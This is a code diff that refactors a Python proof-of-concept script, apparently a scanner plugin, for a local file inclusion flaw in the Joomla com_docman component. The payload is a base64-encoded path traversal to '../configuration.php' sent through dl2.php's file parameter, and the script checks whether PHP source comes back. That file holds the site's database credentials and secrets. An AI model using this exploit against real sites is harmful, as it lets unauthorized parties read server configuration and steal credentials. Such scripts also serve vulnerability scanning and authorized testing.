@@ -9,20 +9,13 @@ description: joomla组件com_docman 文件com_docman/dl2.php中参数file被base
 import sys
 import requests
 import warnings
-
-
-
-class com_docman_lfi:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['joomla组件com_docman本地文件包含','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/components/com_docman/dl2.php?archive=0&file=Li4vY29uZmlndXJhdGlvbi5waHA="
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 200 and r"<?php" in req.text:
@@ -37,5 +30,5 @@ class com_docman_lfi:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = com_docman_lfi(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
